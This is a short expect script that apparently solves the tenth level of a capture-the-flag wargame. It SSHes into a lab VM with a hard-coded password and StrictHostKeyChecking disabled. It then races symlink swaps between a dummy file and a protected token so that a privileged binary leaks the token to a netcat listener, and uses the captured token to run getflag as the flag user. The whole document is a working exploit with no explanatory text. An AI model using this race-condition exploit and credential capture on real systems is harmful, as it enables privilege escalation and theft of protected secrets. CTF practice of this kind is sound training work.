#!/usr/bin/expect -f
set ip 192.168.1.103
spawn ssh -o "StrictHostKeyChecking no" level10@$ip -p 4242 "mkdir -p /tmp/level10 ; cd /tmp/level10 ; rm -rf ./* ; chmod 777 . ; touch /tmp/level10/file ; killall -q -w nc ; nc -k -l 6969 > /tmp/level10/rec & for i in \`seq 1 1000\`\; do ln -fs /tmp/level10/file /tmp/level10/link; ln -fs /home/user/level10/token /tmp/level10/link; done & for i in \`seq 1 1000\`\; do /home/user/level10/level10 /tmp/level10/link 127.0.0.1 >> /tmp/level10/send; done ; cat /tmp/level10/rec | grep '\[a-z0-9\]' | head -1"
expect "sword:"
send "s5cAJpM8ev6XHw998pRWG728z\r"
expect -re "\r\n(.*?)\r\n"
set password $expect_out(1,string)
spawn ssh -o "StrictHostKeyChecking no" flag10@$ip -p 4242 "getflag"
expect "sword:"
send "$password\r"
interact
